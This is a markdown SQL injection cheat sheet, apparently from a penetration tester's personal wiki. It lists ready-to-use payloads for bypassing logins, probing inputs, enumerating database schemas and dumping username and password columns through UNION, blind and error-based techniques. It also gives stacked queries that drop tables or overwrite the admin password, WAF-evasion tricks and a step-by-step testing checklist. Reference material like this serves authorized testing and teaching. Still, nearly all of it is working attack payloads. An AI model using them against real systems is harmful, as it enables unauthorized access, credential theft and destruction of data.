# SQL Injection (SQLi)

Manual SQLi payloads, detection, and exploitation theory. For automation, see [[SQLMap]].

---

## What is it?

Injecting SQL fragments into an application's query so the database executes attacker-controlled logic. Caused by string-concatenated queries with no parameterization.

---

## The classic auth-bypass payloads

Drop these into login forms, search boxes, ID parameters — anywhere user input might land inside a SQL query.

```sql
-- Tautology (always true) — the bread and butter
' OR 1=1-- -
' OR '1'='1
' OR '1'='1'-- -
" OR "1"="1
" OR ""="
' OR 1=1;-- -
' OR 1=1#
' OR 1=1/*
admin'-- -
admin'#
admin'/*
admin' OR '1'='1
admin' OR '1'='1'-- -

-- No quotes (numeric / unquoted contexts)
OR 1=1
1 OR 1=1
1) OR (1=1
1)) OR ((1=1

-- Unbalanced quote variations (when ' breaks the query)
') OR ('1'='1
') OR ('1'='1'-- -
')) OR (('1'='1
")) OR (("1"="1
```

**Why `-- -` and not just `--`?**
MySQL and PostgreSQL require whitespace (or end-of-line) after `--` for it to count as a comment. `-- -` guarantees a non-NUL character after the dashes, which is safer across DBs and URL contexts than `-- ` (the trailing space sometimes gets trimmed).

### Comment terminators by DB

| Comment | DBs | Notes |
|:--------|:----|:------|
| `-- ` (with space) | MySQL, PostgreSQL, MSSQL, Oracle, SQLite | Space required in MySQL/PG |
| `-- -` | All of the above | Safer alternative — non-space char after dashes |
| `#` | MySQL, MariaDB | Inline; not standard SQL |
| `/* ... */` | MySQL, MSSQL, PostgreSQL, Oracle | Block comment; can also be used to bypass filters |
| `;%00` | Older MySQL, some MSSQL | Null-byte truncation |

---

## Detection

### Probe characters

Submit one at a time and watch for errors, page differences, or timing changes:

```
'
"
`
\
%27
%22
'"
';
"--
';--
') --
")--
' OR '1
" OR "1
```

### Look for

- DB error strings in the response (`MySQL`, `mysqli_`, `ORA-`, `PostgreSQL`, `Microsoft OLE DB`, `SQLSTATE`, `unclosed quotation mark`, `syntax error`)
- HTTP 500 vs 200 differences
- Length / content differences between `' AND 1=1-- -` and `' AND 1=2-- -`
- Time delays from sleep payloads (see [Blind](#blind-sqli))

---

## Types

| Type | Description | Example |
|:-----|:------------|:--------|
| **In-band (UNION)** | Results in HTTP response | `' UNION SELECT user,pass FROM users-- -` |
| **In-band (Error)** | Errors leak data | `' AND extractvalue(1,concat(0x7e,version()))-- -` |
| **Blind (Boolean)** | True/False alters response | `' AND 1=1-- -` vs `' AND 1=2-- -` |
| **Blind (Time)** | True branch sleeps | `' AND SLEEP(5)-- -` |
| **Out-of-band (OOB)** | DNS / HTTP exfil | Oracle UTL_HTTP, MSSQL xp_dirtree |
| **Stacked** | Second query after `;` | `'; DROP TABLE users-- -` (MSSQL, Postgres) |

---

## UNION-based SQLi

```sql
-- 1. Find column count (increment until error or behavior change)
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -

-- Or with UNION + NULLs
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -

-- 2. Find which columns are displayed (which accept strings)
' UNION SELECT 'a',NULL,NULL-- -
' UNION SELECT NULL,'a',NULL-- -
' UNION SELECT NULL,NULL,'a'-- -

-- 3. Fingerprint the DB
' UNION SELECT @@version,NULL,NULL-- -            -- MySQL / MSSQL
' UNION SELECT version(),NULL,NULL-- -            -- PostgreSQL
' UNION SELECT banner,NULL,NULL FROM v$version-- -  -- Oracle
' UNION SELECT sqlite_version(),NULL,NULL-- -     -- SQLite

-- 4. Enumerate schema (MySQL / MSSQL / PG via information_schema)
' UNION SELECT table_schema,table_name,NULL FROM information_schema.tables-- -
' UNION SELECT table_name,column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -

-- 5. Dump data
' UNION SELECT username,password,NULL FROM users-- -
' UNION SELECT GROUP_CONCAT(username,0x3a,password),NULL,NULL FROM users-- -   -- MySQL one-shot
```

---

## Blind SQLi

### Boolean-based

```sql
-- True / False oracle — compare the two responses
' AND 1=1-- -
' AND 1=2-- -

-- Extract one char at a time (binary search by ASCII)
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'-- -
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>77-- -
```

### Time-based

```sql
-- MySQL
' AND SLEEP(5)-- -
' AND IF(1=1,SLEEP(5),0)-- -
' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a',SLEEP(5),0)-- -

-- PostgreSQL
'; SELECT pg_sleep(5)-- -

-- MSSQL
'; WAITFOR DELAY '0:0:5'-- -
'; IF (1=1) WAITFOR DELAY '0:0:5'-- -

-- Oracle
' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1-- -
```

---

## Error-based payloads

```sql
-- MySQL (extractvalue / updatexml)
' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -

-- MSSQL (convert error)
' AND 1=convert(int,(SELECT @@version))-- -

-- PostgreSQL (cast error)
' AND 1=cast((SELECT version()) AS int)-- -

-- Oracle
' AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE rownum=1))-- -
```

---

## Stacked queries

Only works on DBs / drivers that allow multiple statements per query (MSSQL, PostgreSQL, sometimes MySQL via mysqli_multi_query, SQLite via sqlite3 in some bindings — **not** PHP `mysql_query`).

```sql
'; INSERT INTO users (username,password) VALUES ('hax','hax')-- -
'; DROP TABLE users-- -
'; UPDATE users SET password='owned' WHERE username='admin'-- -
```

---

## Bypass / WAF evasion

| Technique | Example |
|:----------|:--------|
| Case variation | `SeLeCt`, `UnIoN` |
| Inline comments | `SEL/**/ECT`, `UN/**/ION` |
| Tab / newline | `SELECT%09`, `SELECT%0a` |
| URL-encoding | `%27` (`'`), `%20` (space), `%2d%2d` (`--`) |
| Double encoding | `%2527` for `'` |
| Null byte | `payload%00` |
| Alt whitespace | `+`, `/**/`, `%a0` |
| Quoting variations | `0x61646d696e` instead of `'admin'` (MySQL hex) |
| String concat | `CHAR(97,100,109,105,110)` for `'admin'` |
| Logic equivalents | `OR 1=1` → `OR 2>1`, `OR 'a'='a'`, `OR true` |
| Keyword splitting | `UN`+`ION`+` SE`+`LECT` via concatenation |

---

## Useful info_schema / system queries

```sql
-- MySQL / MariaDB
SELECT schema_name FROM information_schema.schemata;
SELECT table_name FROM information_schema.tables WHERE table_schema=database();
SELECT column_name FROM information_schema.columns WHERE table_name='users';
SELECT user(), current_user(), database(), version();

-- PostgreSQL
SELECT datname FROM pg_database;
SELECT tablename FROM pg_tables WHERE schemaname='public';
SELECT current_user, current_database(), version();

-- MSSQL
SELECT name FROM sys.databases;
SELECT name FROM sysobjects WHERE xtype='U';
SELECT @@version, system_user, db_name();

-- Oracle
SELECT table_name FROM all_tables;
SELECT column_name FROM all_tab_columns WHERE table_name='USERS';
SELECT banner FROM v$version;
SELECT user FROM dual;

-- SQLite
SELECT name FROM sqlite_master WHERE type='table';
SELECT sql FROM sqlite_master WHERE name='users';
```

---

## Quick testing checklist

- [ ] Test every input with `'`, `"`, and `\`
- [ ] Try the auth-bypass set in any login form (`' OR 1=1-- -`, `admin'-- -`)
- [ ] Try unquoted/numeric injection in numeric IDs (`1 OR 1=1`)
- [ ] Compare `' AND 1=1-- -` vs `' AND 1=2-- -` for boolean blind
- [ ] Try `' AND SLEEP(5)-- -` (MySQL) / `WAITFOR DELAY` (MSSQL) for time-based
- [ ] Find column count with `ORDER BY` ramp
- [ ] Fingerprint the DB before targeted payloads
- [ ] Hand off to [[SQLMap]] once a parameter is confirmed

---

## Resources

- [PortSwigger Web Security Academy — SQLi](https://portswigger.net/web-security/sql-injection)
- [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [OWASP SQL Injection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

### PentestMonkey cheat sheets (per-DB)

- [Oracle SQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)
- [Informix SQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet)
- [MSSQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
- [MySQL SQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
- [Postgres SQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)
- [DB2 SQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet)
- [Ingres SQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet)
- [MS Access SQLi Cheat Sheet](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

---

## See Also

- [[SQLMap]] — Automate SQLi exploitation once you've confirmed a parameter
- [[Burp_Suite]] — Capture / replay / fuzz SQLi payloads in Repeater & Intruder
- [[SQL_commands]] — Underlying SQL syntax reference
- [[XSS]] — The other classic web injection
